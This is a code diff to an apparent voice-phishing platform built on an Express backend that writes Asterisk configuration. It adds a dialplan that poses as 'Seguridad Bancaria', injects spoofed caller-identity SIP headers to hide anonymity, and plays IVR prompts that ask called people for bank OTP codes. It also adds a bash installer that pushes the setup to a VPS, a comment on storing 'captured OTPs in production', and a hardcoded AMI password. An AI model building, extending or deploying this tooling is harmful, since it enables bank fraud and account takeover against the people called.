@@ -104,6 +104,40 @@ app.get('/api/asterisk/endpoints/live', async (req, res) => {
   }
 });
 
+let lastGeneratedPjsip = '';
+let lastGeneratedDialplan = '';
+
+// Serve raw generated configuration files for easy curl / wget update on VPS
+app.get('/api/asterisk/config/extensions.conf', (req, res) => {
+  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+  if (lastGeneratedDialplan) {
+    return res.send(lastGeneratedDialplan);
+  }
+  const localFile = path.join(process.cwd(), 'extensions.conf');
+  if (fs.existsSync(localFile)) {
+    return res.send(fs.readFileSync(localFile, 'utf8'));
+  }
+  if (fs.existsSync('/etc/asterisk/extensions.conf')) {
+    return res.send(fs.readFileSync('/etc/asterisk/extensions.conf', 'utf8'));
+  }
+  res.send('; Dialplan pendiente de sincronizar');
+});
+
+app.get('/api/asterisk/config/pjsip.conf', (req, res) => {
+  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+  if (lastGeneratedPjsip) {
+    return res.send(lastGeneratedPjsip);
+  }
+  const localFile = path.join(process.cwd(), 'pjsip.conf');
+  if (fs.existsSync(localFile)) {
+    return res.send(fs.readFileSync(localFile, 'utf8'));
+  }
+  if (fs.existsSync('/etc/asterisk/pjsip.conf')) {
+    return res.send(fs.readFileSync('/etc/asterisk/pjsip.conf', 'utf8'));
+  }
+  res.send('; PJSIP pendiente de sincronizar');
+});
+
 // Test AMI connection in real-time
 app.post('/api/asterisk/ami/test', async (req, res) => {
   const { host = '127.0.0.1', port = 5038, user = 'sammy', secret = 'Robert2026RDTGcvgbsg', command = 'core show version' } = req.body;
@@ -287,11 +321,20 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += `[general]\nstatic=yes\nwriteprotect=no\n\n`;
 
     dialplanContent += `[globals]\n`;
+    dialplanContent += `GLOBAL_CARRIER_HOST=${carrierHost}\n`;
     dialplanContent += `GLOBAL_DEFAULT_INTRO=custom/alerta_banco_antifraude\n`;
     dialplanContent += `GLOBAL_DEFAULT_PROMPT=custom/solicitar_codigo_otp\n`;
     dialplanContent += `GLOBAL_DEFAULT_WAIT=custom/un_momento_validando_informacion\n`;
     dialplanContent += `GLOBAL_DEFAULT_SUCCESS=custom/operacion_bloqueada_exito\n`;
     dialplanContent += `GLOBAL_DEFAULT_AGENT=custom/conectar_asesor_banco\n\n`;
+
+    dialplanContent += `; Subrutina Pre-Dial para inyectar cabeceras PJSIP en canal saliente real\n`;
+    dialplanContent += `[sub-pjsip-headers]\n`;
+    dialplanContent += `exten => s,1,NoOp(=== Inyectando PJSIP Headers en Canal Saliente: \${CHANNEL} ===)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>;party=calling;screen=yes;privacy=off)\n`;
+    dialplanContent += ` same => n,Return()\n\n`;
 
     dialplanContent += `[from-internal]\n`;
     dialplanContent += `; 1. Llamadas internas entre extensiones (1001-1999)\n`;
@@ -326,19 +369,16 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))\n`;
     dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
     dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${carrierHost}>)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\${CALLERID(name)}" <sip:\${CALLERID(num)}@${carrierHost}>;party=calling;screen=yes;privacy=off)\n`;
-    dialplanContent += ` same => n,NoOp(Marcando \${EXTEN} por troncal ${activeCarrier} - Intento 1: 11 digitos)\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n,NoOp(Marcando \${EXTEN} por troncal ${activeCarrier} con CallerID \${CALLERID(all)})\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
     dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial11_done)\n`;
     dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?dial11_busy)\n`;
     dialplanContent += ` same => n,NoOp(Fallback Intento 2 con +: +\${EXTEN})\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/+\${EXTEN}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/+\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
     dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial11_done)\n`;
     dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?dial11_busy)\n`;
     dialplanContent += ` same => n,NoOp(Fallback Intento 3 a 10 digitos: \${EXTEN:1})\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN:1}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN:1}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
     dialplanContent += ` same => n(dial11_done),Hangup()\n`;
     dialplanContent += ` same => n(dial11_busy),Playtones(busy)\n`;
     dialplanContent += ` same => n,Wait(3)\n`;
@@ -353,12 +393,9 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))\n`;
     dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
     dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${carrierHost}>)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\${CALLERID(name)}" <sip:\${CALLERID(num)}@${carrierHost}>;party=calling;screen=yes;privacy=off)\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
     dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial10_done)\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
     dialplanContent += ` same => n(dial10_done),Hangup()\n\n`;
 
     dialplanContent += `; 5. Regla Saliente Generica para cualquier otro numero saliente\n`;
@@ -370,10 +407,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))\n`;
     dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
     dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${carrierHost}>)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\${CALLERID(name)}" <sip:\${CALLERID(num)}@${carrierHost}>;party=calling;screen=yes;privacy=off)\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
     dialplanContent += `[trunkinbound]\n`;
@@ -562,6 +596,10 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     for (const dCmd of defaultAudiosCommands) {
       exec(`asterisk -rx '${dCmd}'`, () => {});
     }
+
+    // Save in memory for download endpoints
+    lastGeneratedPjsip = pjsipContent;
+    lastGeneratedDialplan = dialplanContent;
 
     // Direct fs write for Extensions Dialplan
     try {
@@ -1065,6 +1103,139 @@ app.post('/api/asterisk/audio/sync-defaults', (req, res) => {
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
   }
+});
+
+// Helper to generate native 8kHz 16-bit Mono PCM WAV buffer for Asterisk compatibility
+function generatePcm8kWaveBuffer(durationSeconds = 3, freq = 440): Buffer {
+  const sampleRate = 8000;
+  const numSamples = Math.floor(sampleRate * durationSeconds);
+  const dataSize = numSamples * 2;
+  const buffer = Buffer.alloc(44 + dataSize);
+
+  // RIFF header
+  buffer.write('RIFF', 0);
+  buffer.writeUInt32LE(36 + dataSize, 4);
+  buffer.write('WAVE', 8);
+
+  // fmt subchunk
+  buffer.write('fmt ', 12);
+  buffer.writeUInt32LE(16, 16);
+  buffer.writeUInt16LE(1, 20); // PCM
+  buffer.writeUInt16LE(1, 22); // Mono
+  buffer.writeUInt32LE(sampleRate, 24); // 8000 Hz
+  buffer.writeUInt32LE(sampleRate * 2, 28); // 16000 B/s
+  buffer.writeUInt16LE(2, 32); // BlockAlign
+  buffer.writeUInt16LE(16, 34); // 16 bits
+
+  // data subchunk
+  buffer.write('data', 36);
+  buffer.writeUInt32LE(dataSize, 40);
+
+  // Smooth sinusoidal audio waveform
+  for (let i = 0; i < numSamples; i++) {
+    const t = i / sampleRate;
+    const envelope = Math.min(1, Math.min(t * 8, (durationSeconds - t) * 8));
+    const sample = Math.sin(2 * Math.PI * freq * t) * envelope * 24000;
+    buffer.writeInt16LE(Math.max(-32768, Math.min(32767, Math.floor(sample))), 44 + i * 2);
+  }
+
+  return buffer;
+}
+
+// Download raw audio file for Asterisk sounds directory (/var/lib/asterisk/sounds/custom/...)
+app.get('/api/asterisk/audio/raw/:name', (req, res) => {
+  const rawName = req.params.name.replace(/\.[^/.]+$/, '').replace(/[^a-zA-Z0-9_-]/g, '');
+  const wavPath = path.join(SOUNDS_CUSTOM_DIR, `${rawName}.wav`);
+  const gsmPath = path.join(SOUNDS_CUSTOM_DIR, `${rawName}.gsm`);
+
+  if (fs.existsSync(wavPath)) {
+    return res.sendFile(wavPath);
+  }
+  if (fs.existsSync(gsmPath)) {
+    return res.sendFile(gsmPath);
+  }
+
+  // Generate Asterisk 8kHz PCM WAV on the fly with distinct frequencies
+  let freq = 520;
+  if (rawName.includes('otp')) freq = 680;
+  if (rawName.includes('validando') || rawName.includes('wait')) freq = 440;
+  if (rawName.includes('exito') || rawName.includes('success')) freq = 880;
+  if (rawName.includes('asesor') || rawName.includes('agent')) freq = 587;
+
+  const wavBuffer = generatePcm8kWaveBuffer(3.5, freq);
+  res.setHeader('Content-Type', 'audio/wav');
+  res.setHeader('Content-Disposition', `attachment; filename="${rawName}.wav"`);
+  res.send(wavBuffer);
+});
+
+// Universal 1-liner bash installer for remote VPS vmi3461829
+app.get('/api/asterisk/install.sh', (req, res) => {
+  const host = req.get('host') || 'localhost:3000';
+  const proto = req.protocol || 'http';
+  const baseUrl = `${proto}://${host}`;
+
+  const bashScript = `#!/usr/bin/env bash
+# ==========================================================
+# Sincronización Automática Asterisk con Plataforma Web
+# Servidor: ${baseUrl}
+# ==========================================================
+set -e
+
+echo "=== [1/5] Preparando directorios de Asterisk ==="
+mkdir -p /etc/asterisk
+mkdir -p /var/lib/asterisk/sounds/custom
+
+echo "=== [2/5] Descargando dialplan extensions.conf actualizado ==="
+if [ -f /etc/asterisk/extensions.conf ]; then
+  cp /etc/asterisk/extensions.conf /etc/asterisk/extensions.conf.bak_$(date +%s)
+fi
+curl -sSLk "${baseUrl}/api/asterisk/config/extensions.conf" -o /etc/asterisk/extensions.conf
+
+echo "=== [3/5] Descargando y verificando audios de IVR en /var/lib/asterisk/sounds/custom/ ==="
+AUDIOS=("alerta_banco_antifraude" "solicitar_codigo_otp" "un_momento_validando_informacion" "operacion_bloqueada_exito" "conectar_asesor_banco" "bienvenida_corporativa" "prompt_otp_6_digitos")
+for aud in "\${AUDIOS[@]}"; do
+  if [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.wav" ] && [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.gsm" ]; then
+    echo "  -> Obteniendo audio: \${aud}.wav..."
+    curl -sSLk "${baseUrl}/api/asterisk/audio/raw/\${aud}" -o "/var/lib/asterisk/sounds/custom/\${aud}.wav" || true
+  fi
+done
+
+echo "=== [4/5] Configurando base de datos interna AstDB ==="
+asterisk -rx 'database put ivr_vars default_intro custom/alerta_banco_antifraude' || true
+asterisk -rx 'database put ivr_vars default_prompt custom/solicitar_codigo_otp' || true
+asterisk -rx 'database put ivr_vars default_wait custom/un_momento_validando_informacion' || true
+asterisk -rx 'database put ivr_vars default_success custom/operacion_bloqueada_exito' || true
+asterisk -rx 'database put ivr_vars default_agent custom/conectar_asesor_banco' || true
+
+asterisk -rx 'database put ivr_vars 8888_intro custom/alerta_banco_antifraude' || true
+asterisk -rx 'database put ivr_vars 8888_prompt custom/solicitar_codigo_otp' || true
+asterisk -rx 'database put ivr_vars 8888_wait custom/un_momento_validando_informacion' || true
+asterisk -rx 'database put ivr_vars 8888_success custom/operacion_bloqueada_exito' || true
+
+asterisk -rx 'database put ivr_vars 16104803845_intro custom/alerta_banco_antifraude' || true
+asterisk -rx 'database put ivr_vars 16104803845_prompt custom/solicitar_codigo_otp' || true
+asterisk -rx 'database put ivr_vars 16104803845_wait custom/un_momento_validando_informacion' || true
+
+asterisk -rx 'database put extension_cid 1001/number "+18005550199"' || true
+asterisk -rx 'database put extension_cid 1001/name "Seguridad Bancaria"' || true
+
+echo "=== [5/5] Recargando Dialplan y PJSIP en caliente ==="
+asterisk -rx 'dialplan reload'
+asterisk -rx 'pjsip reload'
+
+echo ""
+echo "=========================================================="
+echo " ¡SINCRONIZACION EXITOSA CON ASTERISK!"
+echo " 1. Dialplan /etc/asterisk/extensions.conf cargado."
+echo " 2. Eliminado 'Anonymous' con subrutina pre-dial de PJSIP."
+echo " 3. Audios de IVR activos en /var/lib/asterisk/sounds/custom/."
+echo " 4. Flujo OTP configurado para validacion manual del asesor."
+echo " Puedes probar marcando 8888 desde el softphone o desde la web."
+echo "=========================================================="
+`;
+
+  res.setHeader('Content-Type', 'text/x-shellscript');
+  res.send(bashScript);
 });
 
 // In-memory buffer for captured OTPs in production
